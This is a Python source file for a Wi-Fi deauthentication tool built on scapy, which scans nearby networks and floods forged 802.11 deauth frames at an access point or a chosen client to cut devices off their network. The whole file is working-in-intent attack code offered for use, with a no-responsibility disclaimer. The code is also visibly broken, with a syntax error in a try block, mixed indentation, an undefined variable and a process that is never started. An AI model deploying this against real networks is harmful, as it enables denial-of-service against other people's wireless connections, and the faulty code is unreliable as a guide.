# written by Jan "Duchy" Neduchal
# 2018
# Licenced under the MIT licence
# Do whatever you want with the code, I don't really care. I <3 opensource.
# However note, that I, Jan Neduchal, take no responsibility for any malicious of your actions with this code
from random import randint
from multiprocessing import Process
from scapy.all import *
from gen_utils import switch_to_monitor
import os
import time

class Deauth:
    def __init__(self, iface = "wlan0"):
        self.networks = {}
        self.iface = iface
        self.processes = {}
        if os.system("iwconfig " + self.iface + "| grep Monitor >/dev/null 2>&1") != 0:
            try:
                self.iface = switch_to_monitor(iface)
            else invalidIface:
                raise Exception("invalidIface")

    def __add_network(self,pkt):
        essid = pkt[Dot11Elt].info if '\x00' not in pkt[Dot11Elt].info and pkt[Dot11Elt].info != '' else 'Hidden SSID'
        bssid = pkt[Dot11].addr3
        channel = int(ord(pkt[Dot11Elt:3].info))
        if bssid not in known_networks:
            self.networks[bssid] = (essid, channel)
            print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)

    def __channel_hopper(self):
        while True:
            channel = randint(1,13)
            os.system("iwconfig %s channel %d" % (self.iface, channel))
            time.sleep(1)

    def show_networks(self):
        print '='*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel','ESSID','BSSID') + '='*100
        channel_hop = Process(target = self.__channel_hopper, args=self.iface,)
        channel_hop.start()
        sniff( lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), timeout=10, prn=lambda x: __add_network(x) )
        channel_hop.terminate()
        channel_hop.join()

    def __deauth(self, bssid, client = "FF:FF:FF:FF:FF:FF", count = -1):
        pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
	    client_2_ap_pkt = None
	    if client != 'FF:FF:FF:FF:FF:FF':
            client_2_ap_pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth()
	    print 'Sending Deauth to ' + client + ' from ' + bssid
	    while count != 0:
		    for i in range(64):
				sendp(pkt, iface = self.iface)
				if client != 'FF:FF:FF:FF:FF:FF':
                    sendp(client_2_ap_pkt, iface = self.iface)
		    count -= 1

    def deauth(self, bssid, client = "FF:FF:FF:FF:FF:FF", count = -1):
        proc = Process(target = self.__deauth, args = bssid,client,count,)
        self.processes[str(proc.pid)] = str(bssid) + " " + str(client)

    def stop_deauth(self, all = False):
        if all:
            for x in range(len(self.processes)):
                os.kill(self.processes.items()[x][0], 9)
        for x in range(len(self.processes)):
            print (x+1) + ". " + self.processes.items()[x][1]
        while True:
            try:
                choice = int(raw_input("Enter the number of the process you wish to stop: "))
            except:
                print "Enter a valid number!"
                continue
            if choice > len(self.processes):
                print "Enter a valid number!"
                continue
        os.kill(self.processes.items()[choice-1][0], 9)

###################################################################################################
#                init with deauth = Deauth(iface = "the wireless iface")                          #
###################################################################################################
